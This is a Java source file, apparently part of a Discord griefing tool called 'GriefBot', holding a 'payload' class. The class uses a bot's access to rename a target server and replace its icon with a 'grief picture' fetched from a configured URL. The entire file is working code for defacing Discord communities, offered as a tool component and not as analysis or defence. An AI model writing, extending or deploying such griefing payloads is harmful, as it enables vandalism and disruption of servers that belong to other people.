package de.corruptedbytes.payload.impl;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

import javax.imageio.ImageIO;

import de.corruptedbytes.GriefBot;
import de.corruptedbytes.logger.GriefBotLogger;
import de.corruptedbytes.logger.GriefBotLoggerLevel;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Icon;

public class PayloadServerChange implements Runnable {

	private Guild guild;
	private String name;
	
	public PayloadServerChange(Guild guild, String name) {
		this.guild = guild;
		this.name = name;
	}
	
	@Override
	public void run() {
		guild.getManager().setName(name).queue();
		
		try {
			guild.getManager()
					.setIcon(Icon.from(getImageBlob(ImageIO.read(new URL(GriefBot.getInstance().getGriefPicture())))))
					.queue();
		} catch (IOException e) {
			GriefBotLogger.log(e.getMessage(), GriefBotLoggerLevel.ERROR);
		}
	}
	
	
	private InputStream getImageBlob(BufferedImage bufferedImage) throws IOException {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ImageIO.write(bufferedImage, "png", baos);
		InputStream is = new ByteArrayInputStream(baos.toByteArray());

		return is;
	}

}
